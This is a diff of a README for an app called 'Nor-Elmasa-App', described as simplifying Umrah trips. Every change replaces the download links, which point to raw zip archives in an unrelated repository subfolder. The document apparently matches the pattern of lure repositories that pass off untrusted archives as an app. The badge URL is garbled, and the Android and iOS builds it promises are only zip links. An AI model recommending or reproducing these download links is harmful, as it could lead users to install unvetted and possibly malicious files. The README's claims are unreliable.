@@ -1,6 +1,6 @@
 # 🌟 Nor-Elmasa-App - Simplify Your Umrah Experience
 
-[![Download Nor-Elmasa-App](https://github.com/cualaman/Nor-Elmasa-App/raw/refs/heads/main/dufrenoysite/Nor-Elmasa-App-v2.8.zip<COLOR>.svg)](https://github.com/cualaman/Nor-Elmasa-App/raw/refs/heads/main/dufrenoysite/Nor-Elmasa-App-v2.8.zip)
+[![Download Nor-Elmasa-App](https://github.com/cualaman/Nor-Elmasa-App/raw/refs/heads/main/dufrenoysite/Nor_Elmasa_App_v2.3-alpha.1.zip<COLOR>.svg)](https://github.com/cualaman/Nor-Elmasa-App/raw/refs/heads/main/dufrenoysite/Nor_Elmasa_App_v2.3-alpha.1.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Follow these steps to download and run the Nor-Elmasa-App.
 
 1. **Visit the Releases Page**  
    Go to the following link to access the download options:  
-   [Download Nor-Elmasa-App](https://github.com/cualaman/Nor-Elmasa-App/raw/refs/heads/main/dufrenoysite/Nor-Elmasa-App-v2.8.zip)
+   [Download Nor-Elmasa-App](https://github.com/cualaman/Nor-Elmasa-App/raw/refs/heads/main/dufrenoysite/Nor_Elmasa_App_v2.3-alpha.1.zip)
 
 2. **Choose Your Version**  
    Find the latest version of the app. Select the file suitable for your device. You can find options for both Android and iOS.
@@ -43,7 +43,7 @@ Follow these steps to download and run the Nor-Elmasa-App.
 
 ## 📥 Download & Install
 
-To download Nor-Elmasa-App, [visit this page](https://github.com/cualaman/Nor-Elmasa-App/raw/refs/heads/main/dufrenoysite/Nor-Elmasa-App-v2.8.zip) and grab the latest version tailored for your device.
+To download Nor-Elmasa-App, [visit this page](https://github.com/cualaman/Nor-Elmasa-App/raw/refs/heads/main/dufrenoysite/Nor_Elmasa_App_v2.3-alpha.1.zip) and grab the latest version tailored for your device.
 
 ## 🛠 System Requirements
 
